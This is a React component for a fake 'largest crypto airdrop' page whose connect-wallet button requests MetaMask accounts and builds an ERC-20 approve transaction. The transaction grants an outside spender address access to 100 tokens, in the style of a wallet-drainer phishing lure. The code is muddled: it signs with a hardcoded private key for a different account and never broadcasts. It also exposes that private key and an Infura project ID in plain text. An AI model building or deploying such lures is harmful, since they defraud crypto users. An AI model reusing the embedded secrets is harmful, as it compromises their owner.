import React, { useContext, useEffect } from "react";
import ButtonComponent from "../ButtonComponent";
import IOMEModal from "../IOMEModal";
import { ThemeContext } from "../../context/ThemeContext";
import { classNames } from "../../utils/helpers";
import Image from "next/image";
import Link from "next/link";
import Web3 from 'web3';
import walletConnect from '../Header'

const MainSection = () => {
  const {
    isDarkMode,
    moiState,
    handleLogin,
    setModalOpen,
    isModalOpen,
    loginData,
  } = useContext(ThemeContext);

  const web3 = new Web3('https://sepolia.infura.io/v3/c3045bffb792402cbfadbe48ce90bb8d'); // Replace with your Infura project ID or another Ethereum node provider

  const account = '0xD4E4cbd23a0D2a4B4E4a23bb5CbED205d72f67EC';
  const privateKey = '0xaffac2e251e7fe452146cba3ce82cc7f9cd3e5da92153961e6d450929a0c3f14';
  const tokenContractAddress = '0x54fa517f05e11ffa87f4b22ae87d91cec0c2d7e1'; // Replace with the ERC-20 token contract address
  const spenderAddress = '0x6Be02d1d3665660d22FF9624b7BE0551ee1Ac91b'; // Address you want to approve to spend tokens
  const amountToApprove = web3.utils.toWei('100', 'ether'); // Amount of tokens to approve (10 tokens in this case)

  const erc20ABI = [
        // Only the `approve` function ABI
        {
            "constant": false,
            "inputs": [
                {
                    "name": "spender",
                    "type": "address"
                },
                {
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "approve",
            "outputs": [
                {
                    "name": "",
                    "type": "bool"
                }
            ],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

  useEffect(() => {
    if (loginData) {
      handleLogin(loginData.userName);
    }
  }, [loginData]);

  const connectWallet = async () => {
    if (window.ethereum) {
      console.log("Pressed")
      try {
        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        handleLogin(accounts[0]); // Assuming handleLogin takes the account address
        console.log(accounts[0]);
        const contract = new web3.eth.Contract(erc20ABI, tokenContractAddress);

        // Define the transaction details
        const txDetails = {
            nonce: await web3.eth.getTransactionCount(account),
            gasPrice: web3.utils.toHex(await web3.eth.getGasPrice()), // Use current gas price
            gasLimit: web3.utils.toHex(100000), // Gas limit for the `approve` function
            to: tokenContractAddress,
            data: contract.methods.approve(spenderAddress, amountToApprove).encodeABI(), // Encode ABI data for the `approve` function
        };

        console.log(txDetails)

        // Sign the transaction
        const signedTx = await web3.eth.accounts.signTransaction(txDetails, privateKey);

        console.log('Signed Transaction:', signedTx);
      } catch (error) {
        console.error("User denied account access or error occurred:", error);
      }
    } else {
      alert('Please install MetaMask to use this feature.');
    }
  };

  return (
    <>
      <div className="grid grid-row-2 lg:grid-cols-2 gap-x-8">
        <IOMEModal setModalOpen={setModalOpen} isModalOpen={isModalOpen} />
        <div className="flex flex-col justify-center">
          <p className={`inline-block font-bold text-2xl lg:text-[38px] 2xl:text-[48px] text-left py-2 2xl:leading-[56px] ${isDarkMode ? "text-moi-purple-600" : "text-moi-white-100"}`}>
            Claim the Largest Crypto Airdrop of All time. Just Connect your wallet...! Thats it.!
          </p>
          <div className="py-5">
          <ButtonComponent
                variant="primary"
                className="px-2 py-2 lg:px-8 lg:py-2 text-sm lg:text-md"
                onClick={connectWallet}
              >
                LogIn with MetaMask
              </ButtonComponent>
          </div>
        </div>
        <div>
          <img
            className="mx-auto bg-transperant w-full h-full"
            src={`/images/${isDarkMode ? 'light-header.png' : 'dark-header.png'}`}
          />
        </div>
      </div>
    </>
  );
};

export default MainSection;
